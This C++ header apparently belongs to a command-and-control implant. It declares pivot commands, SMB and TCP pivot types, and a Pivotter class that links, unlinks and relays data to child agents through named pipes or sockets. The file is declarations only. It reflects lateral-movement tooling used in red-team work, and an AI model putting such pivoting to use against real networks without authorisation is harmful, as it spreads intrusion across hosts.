#pragma once

#include "std.cpp"
#include "Packer.h"

#define COMMAND_PIVOT_EXEC   37
#define COMMAND_LINK	     38
#define COMMAND_UNLINK	     39

#define PIVOT_TYPE_SMB		  1
#define PIVOT_TYPE_TCP		  2
#define PIVOT_TYPE_DISCONNECT 10

struct SMBAsyncIO {
	OVERLAPPED ovRead;
	DWORD      rdHeader;
	BOOL       rdPending;
	HANDLE     hWriteEvent;
};

struct PivotData {
	ULONG       Id;
	ULONG       Type;
	HANDLE      Channel;
	SOCKET      Socket;
	SMBAsyncIO* asyncIO;
};

class Pivotter
{
public:
	Vector<PivotData> pivots;
	BOOL  pendingWrite          = FALSE;
	BOOL  pendingSMBChildReply  = FALSE;
	DWORD lastSMBChildWriteTick = 0;

	void ProcessPivots(Packer* packer);

	void PostPivotHeaderRead(PivotData* p);
	void LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker);
	void LinkPivotTCP(ULONG taskId, ULONG commandId, CHAR* address, WORD port, Packer* outPacker);
	void UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer* outPacker);
	void WritePivot(ULONG pivotId, BYTE* data, ULONG size);

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};